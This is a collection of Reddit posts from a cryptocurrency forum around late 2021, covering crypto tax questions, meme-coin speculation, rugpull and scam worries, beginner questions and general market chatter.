Another question, I made a 2000$ gain in shiba (invested 4k and got stolen 6k) someone tricked me into transferring it into my wallet, then they transferred it out of my wallet. Transferring a NOT a taxable event, but selling is, and if they transfer it out to there account its like a gift, so any gains they make will be taxable on them since it was sold under their ssn not mine, am I correct? Or will I HAVE to pay the taxes on the 2k gains  they stole from me?

Please help, thanks

When you look at historical snapshots of the markets during previous bullruns you notice a lot of coins that didn't stick around for long.

At the end of the previous bullrun, Dash, bitcoin gold, NEM and Lisk were top 20 coins. Havent heard about those ever since

Many coins get abandoned during bear markets because they cannot keep funding development when the price of their token keeps tanking. Others keep working on their project as they slowly fade into oblivion when the hype dies down.

What currently big coin do you think will not deliver on the hype and slip away in the coming years, and why?

 Perhaps the Crackle drama was simply too ahead of its time for 2016 audiences? Sure, but also no I think. Any of you here have been influenced by the series? Unfamiliar words and technology which personally I couldnt understand in 2016, made me briefly search for what is all this crypto about on internet. Gave up unfortunately, it was to complicated to educate myself about crypto. Not a lot of information or perhaps I didnt knew where to look and what for. Huge opportunity lost, thats for sure. Looking back now thinkingI wish I never mind. Im in now watching the charts with my crypto investment bought in May 2021 at  ATH of the mother of all highest, moving up or down +/- 0.01 % .muppet

There are 7B people in the world. Assuming 0.1% (which is very high eg 1/1000) people own crypto. That's 7,000,000 people invested in crypto. Say on average they have $100 invested each. That's $700M. That is only 0.002% of the market cap of crypto. Assume those 7M people have $1000 on average (which is extremely unlikely) that's still only 0.02%. With that in mind who owns the other 99.98%?

Having recently watched inside job on Netflix how much is owned by hedge funds/institutional investors? If they have 100B's worth of crypto to play with how easy is it for them to mimic lots of individual retail investors and manipulate the market.

Assuming the hedge funds/institutional investors do own 2T worth of crypto they can't realise their gains because the price will crash.

Knowing that 99.98% is owned by the same people who caused the .com bubble and 08 crash are you still comfortable investing in crypto?

Disclaimer - I do not own anything related to crypto currency.

The only news I can find is a Twitter post from 3 days ago

 https://twitter.com/arpaofficial/status/1454512389253058560?t=lAET6CnLRUwqOx79eY9mYg&amp;s=19

Is ARPA going to be a security / random number generator for this new META thing I keep hearing about? Maybe a procedurally generated layer for different games? 

Can anyone shed some light on this ARPA CHAIN? 

Is it a buy? Is it a watch? With LRC pumping, is it just a cause and effect type thing? Do people just see the low price and buy it? 

My googlefu isn't turning anything up.

What's your favorite strategy for accumulation? -
Everybody in the crypto space is different. Some DCA, some  diamond hands , others do option trading. Miners, stakers, etc. Me personally I just do my best to DCA and hope for market revolutions so I can use that to make leaps of progress in my life. As is the goal for most of us I imagine  To help improve the lives of ourselves and others, not be so burdened by the arduous tasks of day to day living.

Why aren't more people looking at Jasmy. Their subreddit has like 3.5k members. That's pathetic given the coin's potential. Its been on a steady rise since I became aware of it but I really think its a matter of time until the sleeping giant awakens.

I found the token by posting on reddit looking for random shitcoins to buy. Someone mentioned Jasmy but it is not a standard Binance smart chain something-INU shitcoin.

Its backed by Sony executives and was made official in Japan yet it goes completely ignored by most people at the moment. Baffles me. 

Thank you for coming to my Ted talk.

After Facebook announcing that they will change name to Meta and change strategy to focus on building a metaverse some cryptos that promise similar things like Descentraland and Sandbox start a huge rally. Of course that's great news for everyone that was invested but this move was completely unjustified.

Let's not confuse thing. While it is true that Facebook wants to build similar things they are not partnering with any of this project and most probably they will never do. A large company like Facebook can build a centralized version of a metaverse, as that will offer larger control of what happens in their platform and by being centralized it will be faster and cheaper to maintain.

I don't want to sound against any of this project or their promises. In fact I'm a sand holder and I don't intend to sell it anytime soon.

I'm almost sure I will be downvoted but who cares? Reddit is not real life.

From the advent of crypto, many have gained much and others even become crypto millionaires. But stories does not happened in the same way as those who become rich. Other loss from few cents to even millions of dollars of hard earned money.

It can be observe that investment can multiply up to 10,000 times or be divided by 10,000 times. Than means with just a $100 can make someone a millionaire ($100 x 10,000). 

With this in mind, this is the take away in investing in crypto.

1. **Only invest excess money.** Never use money for emergency or for daily living.
2. **Don't be greedy**. Turning back to the previous example, a $100 investment can ***gain*** ***$999,000*** ($100 x 10,000 = $1,000,000 - $100 = $990,000) if it multiplied by 10,000. On the other hand, if it was divided by 10,000, one will ***ONLY*** incur a ***loss of $100****.* 
3. **Treat it not an investment but an expense**. Investing in crypto must be treated like buying a consumable thing.  It is like a burger, once you have eaten, it is gone. 
4. **Exit the amount you have invested**. Once your investment grow at least a double, sell and get what you have invested. This will lessen emotional trading as you will only trade with your gain.
5. **Never trade when you are emotional**.  When someone is emotional, since trade can just happen with just few clicks, loss can happen also that way.
6. **Never invest without doing research**. Check the whitepaper, the purpose/utility of the coin, and the developer and/or developments. You can check coinmarketcap and coingecko for data.

Every meme coin I have so far invested in (CATE, SHIB, YOOSHI) has gone up. I am FULLY aware they are likely to crash soon. These are not long-term investments. Also sorry for calling YOOSHI a meme coin to those who really care about the future of video-game centered coins (I do genuinely feel a stronger attachment to it's goal than SHIB or CATE). 

With that disclaimer out of the way, for those of you in for a quick buck, meme coins are doing better right now than they have since DOGE. I've seen well over 50% returns in individual days.

There are not projects with any substance. They are gambling. But if you have money you feel comfortable risking, now is better than waiting for these coins to reach large milestones. Once they hit psychological milestones (anything where the first significant figure is a 1), people will sell and it'll deflate like a balloon. Until that point, be safe, have fun.

For those if you who only invest in coins with a good purpose and a healthy ecosystem, I totally respect that, and your future gains are substantially more reliable than my own (I do have a healthy portfolio of coins with genuine purpose as well).

Have a great day/night!

What are the tax implications for large crypto gains? Let's say (BTC) for example - that I swapped to USDC and paid for day to day expenses with my Coinbase Card and earned 4% back on that ? Never actually converting the entirety of the gains into the dollar, Only fragments over time. How does that affect the daily happenings of spending crypto?Please, anything would help me figure this out haha this one is lost on me, I haven't been able to find proper advice anywhere. So I'll turn to the community here on Reddit. (Really trying to stretch that 500 character limit)

Hey guys,
so I bought some TRAC on KuCoin in 2018 and its been sitting in a wallet for a while. Should be tax free by now according to German law. But to make sure I could prove it I wanted to download my entire transaction history of KuCoin. Problem is - the 2018 history doesnt show ALL the transactions/ I cant come up with the number of tokens I have now. Does anyone have any experience with the KuCoin transaction history? My simple understanding would tell me that the transactions with the correct amount HAVE TO BE THERE somewhere, no? Am I missing something?
Appreciating every bit of idea or knowledge here. Thx!:)

Ok so I know we get all this ridiculous precise predictions from random "crypto analysts" every day, but this is different.
Yesterday I was standing there minding my own business when an Indian guy walked up to me and told me I had, and I quote, "a lucky face". Err, OK. Then he explained that he was a yogi, at which point I realised that this was definitely not about to be some scam where he asked for money.
Then he explained that I was going to have a long life, which I thought was a punchy prediction given that I was smoking at the time (although he did go on to say I had two bad habits, which was true, albeit understated by about 798). But a relief, naturally.
And then, and this is the real meat of it, he said that I was going to have some really good luck connected with money, IN DECEMBER. And then some really big news next year.
So it is apparent that BTC is going to $374069 by EOY, and ETH is going to $23420. I mean literally what else could he have meant?
PS My exchange with this guy is all true.
PPS The resulting prediction is less useful than all the others you have read in here or anywhere else.

Couple of months ago I put 30 bucks with 2 friends (total of 60) in some small coin and it escalated last month. 

My issue is that we put in in 1 wallet (trust wallet) and it is a total of 30k right now. It was bought on binance and then swapped to the desired currency.  We all want the money in our own wallets, but transfers would be worth 15k of crypto. 

I live in the Netherlands and can't see how taxes come in play here. Could someone give me advice? Thanks in advance!

Advice could be legal or illegal. Would like to hear all possibilities!

This can also be relevant towards Cryptocurrency

It's time to think about this, don't Fomo your life savings , just throw some loose change at it and let it ride. Don't day trade crypto unless you have an IQ of over 9000.

Don't go without just to buy meme coins , seriously if you want to hit big put $10 on a few random meme coins and don't look at it for at least 12 months. But you must know, 90% of those coins will be dead by then. Or your random coin goes 40000% and you can go on a holiday at least.

Couple of months ago I put 30 bucks with 2 friends (total of 60) in some small coin and it escalated last month. 

My issue is that we put in in 1 wallet (trust wallet) and it is a total of 30k right now. It was bought on binance and then swapped to the desired currency.  We all want the money in our own wallets, but transfers would be worth 15k of crypto. 

I live in the Netherlands and can't see how taxes come in play here. Could someone give me advice? Thanks in advance.

Advice could be legal or not. I like to hear all possibilities.

does anyone know how to solve this problem? my brother and i invested $70 into Shiba Inu and were able to make like 113.56 now. A friend of mine told me to invest to Floki Inu, but the only way to buy one was through Pancake Swap. I did not have a wallet so I installed the Coinbase Wallet app and transferred my coins in there. There was a $15 fee (which i did not know about but proceeded anyway) so i only had probably around 97 dollars or something. Now, I wanted to trade it to USDCoin or USDTether, but I did not know that you had to  have a balance in Ethereum (around $600) in order to trade it. Now that I wanted to just put it back to my coinbase account its charging me $45 to get it transferred. Can somebody help on what other way to get  my money back in Coinbase app? its me and my brother's lunch money we've been trying to save and i dont want to lose any more of it.

So I've been doing research on crypto and am trying to invest a little, was wondering if anyone can point me in the right direction to previous posts I should read and also explain what platform like coinbase or crypto.com or another I should be using if I'm located in the US and reason why? I would like to introduce myself to the community, I live in Phoenix, AZ. I have had quite a few people in my ear telling me this and that about crypto, what I should and shouldnt do, its all very confusing. ive also done quite a bit of research and am willing to learn. I keep getting messages and seeing posts on facebook people want money for courses and this and that. i would rather just spend my free time reading on the subject matter or talking to you guys in here who have much more experience than I. Thanks in advance appreciate your time if you respond to this!

I'm starting to get that feeling in the back of my neck, a hint of ephemeral foreshadowing. There's a cycle-top out there lurking; once only in the backs of our minds, it now looms somewhere just beyond the probes of a currently murky horizon. And when it gets here? *I want to be absolutely smothered with the weight of decision-making.* Hypothetically, my coins are going parabolic and consistently rolling through waves of daily new ATH's.  


But, do I... \[this is rhetorical, not me asking for advice\]  
\- Sell it all and ease the financial burden of several of my current situations?   
(I can always get back in later)  
**-** Do I HODL at all costs because we're still early and there are tens of trillions of more dollars coming into the market within the next 5 years - hopefully some of which will be pumping into my bags?  


\-Do I compromise and sell off just the alts, keeping the majority play in my blue chips?  


\-Do I compromise and sell just the blue chips because I know they'll correct in the next bear, but I also know they will continue to rise and rise again?   
(I can HODL my smaller MC alts to see if any of them does a 20-30x in the next few years)  


It's exhilarating and intoxicating to me just to think about being sucked into the adrenaline mindset of that situation. What do you expect for the end of this current cycle? Do you foresee a super cycle..or maybe even think we've already topped out? Do you have any specific exit (or non-exit) strategies?

So one point this sub always drives home, (rightly imho) is that tether is ass. Aside from lying to people about each coin being backed by cash one to one, its be embroiled in all sorts of shenanigans. I think most of us can see that there's a very big chance that when tether inevitably gets sued by the gubberment and crumbles, it would do severe damage to the market because of its sheer size. I'm not gonna bother diggin up this dead whore because its 2021 and we've got google.  


I always wondered why so many people refuse to use the other stable coins and still opt for tether. Well, after recently getting into different lending protocols in defi such as Aave and also using the lending tool on kucoin (love both of these very much btw) it became painfully obvious. The returns when lending/depositing USDT is typically anywhere from 2-4 times as high as other stable coins to even getting as high as 10x the returns you'd get if you were using usdc, dai, or any other coin. Not one other coin is a better earner. You're highly incentivized to hold tether.   


This was kind of an "ah hah" moment for me and I thought I'd share for any of the rest of you that cant stay erect and continue to disappoint because you couldn't get this off your mind. Or maybe this was common knowledge and I'm just living up to my namesake.   


Curios to anyone's suggestions on how to fix this or if its even possible aside from just flat out manipulating the market away from USDT.   


anyways, thanks for listening to my inner monologue.

Tl;dr is there anywhere you can see a full list of coins that exist, any contracts on them, their transaction history, and having the option to trade them (exchange)?

I know there are plenty of sites and exchanges that give you a fairly comprehensive list, including the 500 odd new coins that have been created today. My question is more about how do i get to these coins if they are not listed on my exchange.

I keep hearing about people losing everything on rugpull shitcoins and i wanna be a part of it. How would i go about finding out that such a shitcoin exists, and throw money at it (assuming my exchange doesnt list it)? Is it possible for a coin to exist and noone knows it because they never registered it on a certain website?

And is it possible to see its configuration after you know of its existance? Im happy to get some dev work done to get access to this information if its not readily available - mostly just wondering if it's something obtainable or its almost enterily in the hands of the marketing department whether a coin can even "exist" to an average trader?

Thanks in advance

So i read a lot of comments saying that only BTC and ETH are here to stay in the top position for the long run.
Do you think there are other coins in the top 10 that can remain in the top five years from now?
Wich ones and why?

And heres a little german wake up song for you:
Guten Morgen, guten Morgen
Guten Morgen, Sonnenschein
Diese Nacht blieb dir verborgen
Doch du darfst nicht traurig sein
Guten Morgen, Sonnenschein
Nein du darfst nicht traurig sein
Guten Morgen, Sonnenschein
Weck mich auf und komm herein

Everyone of us must have done this atleast once, fomoing into a coin while its pumping and the next sec it starts bleeding.

I have a really good track of fomoing and becoming an eternal hodler. My first coin was PUSH, bought it when it pumped to a new ATH(in my defense,  I bought it when it went down 20%) and have been a hodler for almost a month. It's slowly bleeding.

Next would be MANA, fomoed into it and got royally screwed. 

My pride won't let me sell in loss, so I just hope these coins pump.

What about you guys?  What did you fomo into?

I find it hilarious that SQUID dumped on the people buying it. Lets be real. Anyone buying a shitcoin probably knows its a shitcoin and just hopes to find a buyer to dump it on for a higher price than they bought it (as they post on stocktwits or other forums nonstop).

The buying and dumping continues ad nauseam until the final bag holder is reached. The likelihood of the final bag holder ever seeing profits is close to 0%

They are fully aware that the coin is absolute trash. I think its great that everyone got dumped on.

I know this sounds weird but i was just thinking

Obviously a bear market will come eventually and i know no one can time the market or at least not reliably. So should I sell my alt coins once they've hit something like 2x if they are a major alt like Dot or maybe 10x for something like GRT or ONE? 

I'm just considering this because I could lock in a few 100$ profit this way and it seems from what experienced users are telling me that when the bear market comes this cones will crash 80% and I'll be in the red for years or maybe my coins will never recover.

Does anyone have some wise advice through experience and not just hype or FUD? 

I could really use some guidance through my first bull run

Basically smart contracts are just contracts which are smart. 

Let me explain with the help of an example- Many of you must have kids but only few would have smart kids ..what's the difference they are all kids but some are just smart so we call them smart kids.

Similarly when a contact is smart we call it a smart contact. 

I hope i enhanced your knowledge and understanding of crypto.
I've put extensive research into this so please don't call it a shitpost. 

On a side note can anyone tell me what's the word limit here? Thanks.

ENS is having a DAO soon, and everyone who hold ENS can claim ENS governance token accordingto this tweet: [ENS DAO](https://twitter.com/ensdomains/status/1455283001248698376?s=21). As Im not that familiar with DAO and governance token in general, can someone with more knowledge shed some light on what will happen next? If I hold 1 ENS, does that mean that I will receive 1 ENS token? Is that basically a new coin with its own tokenmic etc (similar to Uniswap token)? Where can I find how many ENS token I will receive? Thanks!

Im genuinely curious about this. Ive seen the comments and posts about what people want to do for others with their gains, or have done. But there two sides to the coin. I happen to on the other side.

For my friends its simple - I dont have any. Well, I do. But they simply could not grow up and get away from drugs. Use to smoke a lot of weed back in high school with my clique (me + 5 others tops). Ive since stopped smoking and maintained a steady job while my friends have either became severely addicted to drugs, or are currently in prison. I cant not in good faith give money to people who will use to kill themselves.

My girlfriend just thinks its a scam and says Im wasting my money. She doesnt care to listen when I talk about it. I pay 100% rent, utilities, groceries and do the great majority of home cooking. I DCA what I can afford after bills. I tried to explain blockchain, defi and the basics of crypto but get told Im wasting my time because she doesnt care (shes interested and asks *me* questions about it when her coworker talks about it though)

Basically, I cant share with my friends because the money would go up their nose and as for my S/o, she thinks its a scam &amp; I feel like I work hard enough to provide for us now, that I should enjoy any gains I waste my money on.

I know others are in similar situations. I dont think anyone should feel bad for not sharing gains in similar situations. After all, it is your investment and I would really like to hear what your stories are.

I recently sold off some positions in various coins that I bought back in 2017/18 on Binance and then transferred to my ledger.  I sold them on coinbase this year and thankfully coinbase has all the records for tax purposes but binance is showing no history for the original purchases.  I tried contacting binance for help, but it was a dead end.  This ended up being a major loss and I am trying to offset my gains from this year with this information.

Does anyone have any advice as to how much proof the IRS will require to prove this loss? I have email confirmations of fund transfers to binance and then confirmation of the coins being withdrawn days later, but no hard proof of the prices that I paid for them.

Any help is greatly appreciated as I would really like to reduce my tax liability for this year.

I currently own about *\[retracted\]* Bitcoin, but that's about it. I bought it last year, as I wanted to begin to get into the crypto world. However, I really don't know much about crypto as a whole and there just seems to be such much information out there from so many difference sources, I don't know where to start. Also, a lot of it seems to be geared towards those who already have more than a basic understanding of crypto, which I do not have.

I just got a new job and would love to start investing some more money into crypto (whether it is  btc, eth, shiba inu, or other new upcoming coins) but would like to start understanding it a lot better. What websites or sources do you guys recommend I use to learn more about crypto, stay up to date on news, tips/advice on certain crypto to buy and when, etc..  Once I learn more about it, I am willing to put in a few thousand into crypto, but before any of that, I really want to make sure I understand it, as well as the finance that comes with it (the market, specific terms, what to follow, best times to sell/buy, etc.)

Any suggestions or help is appreciated!

So i Woke up checked my account on pancakeswap and it had a token that i didnt recognize buying and it showed ridiculous amount of money.  And i cant even sell it cause that will have 98% price impact. So i can only sell a tiny portion.  
Just couple days before, cause of shiba hype, i thought fuck it, took 5 % of my portfolio and put them into handful of new shitcoins. But i dont recognize buying this one. 
So should i sell that tiny portion?

Edit: And just to be safe, i made a new wallet and send my other cryptos to it.

The common theme amongst 30 and 40 year olds? It's always they wish they INVESTED into XYZ 10 or 20 years ago. It is always the same fucking regret. Always the same fucking stories about buying this cheap piece of land, this Apple stock from 90s, this AMZ, this TESLA stock.

Nobody ever fucking says they regret not spending $200,000 instead of $20,000 on a car 10 years ago. Fucking nobody. Those that say $200,000 cars a 'worth it' already have $20 million or more and that's why they spend $200k on gratification and enjoyment. You just made $500,000 or whatever from crypto. You're not on that level. 

Keep investing. Because I'll fucking say it again: No 40 year old ever regrets not spending more money on car and designer suits and shoes when they were in their 20s.

As the title suggests, this post is to let y'all in a little secret of mine.
FYI this is NOT financial advice, just my experience. Please do your own research before investing (DYOR). 
When I learned about crypto 6 months ago, I was working a minimum wage in a restaurant. Earning $16/hr under the table in a restaurant isn't exactly the job to get yourself a lambo or a condo for that matter. A buddy of mine talked to me about BTC, ETH and some alt coins and I was intrigued. Bitcoin was trading around 63k, Eth around 2.7k. By the time I could buy in, Elon musk and his club in china brought the entire market almost to the ground. I realized then, my 200 portfolio isn't going to help me if I put them in ETH or BTC. So I put them in shit coins. It was an absolute gamble I know but hey I'm an absolute Chad too. 
I bought $100 shib at around $0.000006 it grew 6-7x and saitama for $100 at 0.000000003 it grew 70x
Last night I cashed out entirely to my portfolio being a networth of almost $8000
I can now happy invest in ETH and BTC with like any othe average crypto investor and take my everyday hopium from maxis.
TLDR: invested in shit coins, took profits and reinvested in ETH and BTC.

Back when DOGE had so many zeros it was a laughable, I used to use it to transfer between exchanges. I'd always be sure to clear out every last DOGE, to make sure I wasn't wasting any money. The reality was, "wasting" money would've been one of the best decisions I could've made.

If I had left just a few dollars of all the crypto I was transferring around each time, whether it was Bitcoin, or ETH, or DOGE, or XRB (RaiBlocks which became Nano), I would've made significant amounts of money.

So before you make sure not to "waste" any money and clear out your wallet completely, just leave a little bit behind. You never know when that $1 you left behind is going to 20,000x and become the next big thing.

wtf. They carry shibu or other stupid shitcoins, but some good stuff like high market cap gaming coins they leave off. I was itching to pick up some meta coins yesterday, like sandbox and wax and some other ones. None of them were available on coin base, although it says you can buy on their wallet. I checked binance as well, but I prefer coin base pro. I dont want to fuck around with too many exchanges and wallets, as I dont want the headache of trying keep track of passcodes and seed phrases. So I picked up mana as it was the only one on coinbase. Sand doubled today and I missed out. I dont flip, but I may have flipped that and buy again on dip. Mana went up too, but it was a coin I had to settle for. When TF is coinbase going to  add more coin?

Lets take a simple example. I deposit some AVAX into Aave for an APY of 12%. Wheres that yield coming from? Theres no way someones borrowing AVAX for a higher interest rate than 12%. Nobody borrows crypto right? Why would they? Borrowing fiat with crypto as collateral is what makes sense to me.

What seems even stranger to me is when I hear of random defi apps (yield yack, trader joe) that will give you 40%+ APY. How are they able to give you those kind of returns? 

I understand staking. I understand lending, but I dont know why someone would need to borrow crypto especially at a high enough interest rate to bring about such a huge return. 

Is there any scaminess going on? Can I try putting my coins into one of these high yielding platforms? How could one tell a scamy yield platform from a legit one?

As far as I understood, Genopets is the first move-to-earn NFT game and its powered by Solana, you basically progress your pet by moving and doing physical activity (kinda like Pokemon Go). Im very interested in this project. 

I tried to participate in the token sale but for some reason, my National ID was rejected on Impossible Finance when I wanted to verify for KYC. I created a new wallet and I was thinking about using my passport this time to verify my identity but Im kinda nervous. What if this whole thing isnt legit? Anyone can help?

Thanks

Do not tell other you invest in Crypto, not even your parents and close friends.

If you already told them, do not ever tell them how much you are holding at all. I mean it.

I regretted selling my Crypto back in 2017 when there was so much fear going on and my parents kept telling me to sell because I was holding a huge portion of it. It is because of their influence that made me want to sell the crypto.

However, if I actually hold, I would be able to buy them a decent house and car now but that is okay.

So just remember everyone here, do not tell others you invest in crypto.

**Does anyone here have any encounter or advice ?**

You have 100k and a gun to your head. Make 1M dollars with crypto or you die


Someone has a gun and you can do whatever you want as long as it's crypto related to make a 10x or else you get it. 

Do you start a scam coin like the piece of trash you are? 

But ADA and VET and cry as you watch your money do nothing? 

Added rules are:
-You only have the rest of this market cycle to do it. Or 1 year, whatever comes first. 
-Only 5k allowed for shitcoins/meme coins
-If you end up with less than you started you're whole family gets it too.

What's your game plan ?
How do you give yourself and your family the best chance of survival.

Curious to see if the added rules change the approach people would take.

Back in my day, this sub was about walking up hill both ways in the snow with a boner. Now all these new comers are ruining it with their fucking pets. YOU are the reason this sub is going to shit! This sub is exactly what the whole crypto space is thinking and it is wrong! 

Everyone used to say BTC was going to moon back when there were three currencies. Now all I see are posts talking about stuff that doesn't interest me. Why can't you all think exactly like me? I know I'm right because I've been in crypto for three weeks and I'm a trader. Your coins are shit. Mine are the only ones that deserve to make massive gains. You all disappoint me.

Good evening ladies and gentlemen. Take a look at what %s of the supplies top holders of following coins own compared to a few solid ones:


Coin          Top 10     Top 100 

Doge         43.45%     74.60%

Shib           71.56%    80.06%

Bitcoin      5.43%       15.71%

Cardano   3.90%       21.90%

Kusama    2.06%      13.32%


One quick look at this list should have shown you a couple things:

1. Doge and Shib and 2 shitcoins waiting for a rug pull to happen which will happen 
2. I am shilling my beloved Kusama here 

71.5% of Shib belongs to just 10 wallets, what the actual fuck? If this is not a good reason to not get into shitcoins like Shib idk what is.

Hi all,  I was recently chatting online with a person and eventually we came to the topic of money and making money, when they mentioned they were making a lot through a private liquidity pool.

I, of course was curious, and ended up joining it too from a link they sent me.

I've been in it a few days, but they keep urging me to add more and more to my wallet, which they claim will yield better results in rewards. (Which would be awesome, but also scary as hell if they about to scam me)

So far I have made some money, but with being sooooo uneducated on dApps and the subject in general, me and my wife are worried that there is a possibility that this is bullshit and our wallet will be drained at any moment.

Currently in an invite only mining pool through eth-event.co

Any advice is welcome.

Thanks.

I'm a software engineer, and I really am itching to start a new large project. I would love to see what some of the pain points are in here, or maybe you've had a "man I wish this was an app" type of idea. There are no limits at all, anything can go. I love crypto and want to make an impact on the community.

The app would be available to both ios and android users, and a desktop version would be made as well. I've thought of a few ideas but figured I should come directly to the people and see If I can get any ideas that are validated from the start. Shoot me some ideas ladies and gents.

As the title suggests, i want to understand how using l2 protocols can save money on transfers. Is it as simple as connecting an eth wallet to an l2 and swapping there? Gas fees are obviously painal as of late.

Gas fees are actually at the point where it isnt worthwhile to swap or transfer small holdings off of custodial exchanges. Some have suggested using an l2, but from what i can tell there are still gas fees if i swap on polygon through a regular wallet. Am i wrong there?

Ideally i would want to find something like uniswap except without gas fees. Is this a pipe dream?

Hi, I'm looking to join a community of crypto tech enthusiasts, not crypto investment enthusiasts. I'm sure there's a discord channel somewhere dedicated to crypto tech right?

I joined the eth discord community and, as a newbie, it's a bit overwhelming.

I've been interested in crypto since 2017 and held through the crypto winter. Despite my little involvement on the investment side, I am more interested in the tech side. I started an eth smart contract 4 yrs ago but didn't know what to do with it so I left it unused. Would love to pick it back up and start doing something with it. Actually, I just want to talk to a few people to learn more about crypto tech so I can start contributing. I'm a tech guy at heart and have been in IT for quite a while. I could definitely help in areas such as POS integration and traceability throughout supply chain.

Efinity is a parachain nft and crypto blockchain being created by the team at Enjin. This parachain will operate on/with polkadot ecosystem and be interoperable with tokens of other blockchains. 

the idea is to create paratokens, which will be interoperable with the entire polkadot and kusama ecosystems. 

They are building an NFT marketplace and crypto exchange. 

the token has been out since late august and hasnt done much. you can buy it on uniswap. 

I think this could have a lot of potential. Enjin is a well established gaming company with 4 years of blockchain and dec. gaming experience I think they are going to produce a quality project here. could be nice to get in early!

any heard of this? im curious of yalls thoughts! let me know what you think

So I remember second life and getting into decentraland the other day I found not much has really changed in the metaverse area. But since it is the hot topic right now and because I really really really want it to be something more and mainstream.

Anyways, what is your opinion of the metaverse?

What do you think about crypto being in the mix of it?

What role do you think crypto will play in it?

What are you wanting from it?

How far off do you think until we will see the average person using a metaverse other than trying out it to see what it is about?

&amp;#x200B;

NOTE: because the definition is still out there on what is and isn't a metaverse. Some are saying things like Star Citizen is a metaverse. Assuming it is, I can see that being very much worth while. Even more if there was a way to content it to outside sources.

&amp;#x200B;

(BTW my opinion. I've used second life for a little bit when it was newer. I was extremely young and tried it a few times later. I never could get into it because there just isn't enough to it. Like it is too much role playing and not immersive IMO. It is a nice things to look at, maybe fun for 5 seconds, but that is it. Now again if Star Citizen is a metaverse I think that even in it's current alpha is the nearest thing I seen to what I want. But next to that is the PS home. Where you have a movie area, there was a bowling area, and a ton of things to do. It was actually fun, and liked it. But even that over time had problems, but much of that was poor development, poor management from Sony, and Sony lying about things. But it is one of the few things I still would play today even if it was a small thing giving I had access to it. RIP

But I think when AR takes off this is when we will see the metaverse take off. But we can't have that until we have the tech. AR glasses that take up most of your field of view, and has a few day battery. Or AR contacts. )

Now i know how mixed people are about memecoins, but one of the memecoins I'm invested in launched on the Cardano platform about a month ago. There's been a lot of talk about SundaeSwap being the first dex to launch, and how CatJAM will likely find its home there. A lot of you are probably skeptical, and don't want memecoins on this platform, but I personally think it's great publicity for the Cardano network.

After Shiba mooned, it took over twitter, facebook, instagram, tik tok, etc. It brought a lot of new users into crypto. Dogelon made Crypto.com more popular. So why can't CatJAM do the same for SundaeSwap and the Cardano network in general?

The majority of people don't care about the innovations happening in the crypto space, they only want two things. Memes and money.

I just wanted to get that off my chest, and I'm really excited about the SundaeSwap release as well as the future of the Cardano network (probably the greatest release crypto has seen in a while).

I log into my algo app, take the link to the governance page where my wallet is linked, cast my vote, hit submit and it takes me to my algo wallet where nothing happens, the web page says "please review and sign the transaction" but nothing else. What did I do wrong?

Anyways how are we all feeling about ALGO and its governance? Do y'all think option A or B is good? How are we liking governance rewards?

I love how easy it is to participate in this despite the error I've encountered. Fun to feel like a real part of the Algorand project as a whole.. I personally favor option A since it feels like it is more incentive for new people to join whereas option B makes it more intimidating to use your ALGO for governance. Option B does make sure that people are more likely to hold their ALGO for longer though.

I went three months without constantly looking at my portfolio. I do my regular DCA which goes strait into 4 of my main coins, and I shut it off. 3 days ago I got into a conversation with a coworker about the current shit/meme coin market. He told me he's used some of his gains to gamble a little bit, so I decided to do the same. 

So now we're talking about all these random coins we keep finding, throwing money at them for fun. I've had more fun in the past 3 days than I have in the past 3 months. Constant texting back and forth about this and that. 

What's best is the crypto I sold to fund this whole thing has had a dip since I started. I can double my stash that I sold if I switch it back right now, but where would the fun in that be.

Hey everyone, so I randomly got a message on whatsapp from someone with a pretty sus profile, so I instantly new something was up. After a few msgs I decided to mess with the person a bit and see how far things could get before they caught on. As of yet it looks like they still haven't figured it out. Topic was about cryptocurrency so figured this would be a pretty decent place to post this haha. 

That's about it, though I'll keep typing more stuff to reach the character limit. Ok should be good now. Cheers!

Thats right, I said it. Plenty of people have been burned and a few fantastically so on other coins (particularly those named after a certain canine breed to name a few), but none so blatant and outright scammy as SQUID. In previous examples, most of these people got burned by pure market forces, SQUID did everything except outright steal their money (or did outright steal their money frankly). This wont be the last one Im sure, not saying it will be. However, the more blatant these rugpulls get, the more downright undeniable straight up 100% pure scammy these things get, the more people will start to associate sketchy projects as scams and focus their investments into safe projects. By demonstrating what the core of these moonshot meme coins is, theyre going to bring more attention to the fact that these seemingly less blatant scam tokens are pretty much the same thing, false hope and empty promises. With any luck (I may be relying too much on the education of the average investor) this will reroute a huge amount of capitol towards legitimate and promising projects, garner a continued feeling of safety in crypto investing, and help to grow and develop the community in a positive and meaningful way. 

Sorry for the wordiness, didnt want to have a paragraph at the end full of goobldygork just to fill up the word count. But, I did have one of those apparently.. sorry not sorry.

If you had $100,000 to drop into Crypto what would your portfolio look like?

* How would you diversify?
* Whats a good split between Blue Chip &amp; Alt?
* How much in Meme coins? How would you find the next meme?
* What DeFi options would you use?
* Would you keep any Stablecoins?
* Would you invest in any NFTs?


Im not real looking for the Laser Eyes folks here really trying to figure out what true diversification looks like in this space. Its too tempting to go all in on something - but Id like to hear how people handle this temptation

After setting to ATH's at over $50, DOT came down a bit but has still jumped XRP on the marketcap rankings.  It's been one hell of a day for DOT owners!  I know there's been a lot of celebration already but had to keep the train going

Obviously today's run was about the official start of the parachain auctions in a few days.  For those unfamiliar, [here's](https://polkadot.network/auctions/) on the parachain auctions.  It's very exciting and worth checking out.  Anybody have any thoughts on projects they're interested in?  I'm definitely throwing some DOT into Acala but havent decided on any others.

Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit Text limit

Edit: it looks like DOT and XRP keep fighting it out for the 7 spot. So DOT might have dropped back down at some point.

I'm curious if there's anyone here whose gottenREALLYrich thanks to Crypto. I'm not talking about gaining just a few hundred or a few thousand USD, but hundreds of thousands, or millions of dollars.

If so, how has your life changed? What are you doing with it now? Have you "cashed out" significantly, or is most of your wealth still in Crypto? Have you made any other investments with your earnings (fiat, stocks, real estate, brick and mortar businesses)? Are you living a life of leisure? Did you buy that fancy lambo or house on the lake, are you Pursuing your dreams?

This is all for curiosity sake. And FYI, I am not a Crypto millionaire or anything close to it. I am a still relatively new to Crypto with a small investment to my name. One day I hope to be able to answer this very question with a big fat YES! That is the dream anyways.

* Marketing is the only thing that matters
* The product is worthless and people buy it for no good reason
* None of the people involved are benefiting society, yet it's all a get rich quick scheme
* Damaging to the environment
* Decent chance that the people on top will screw over everyone else

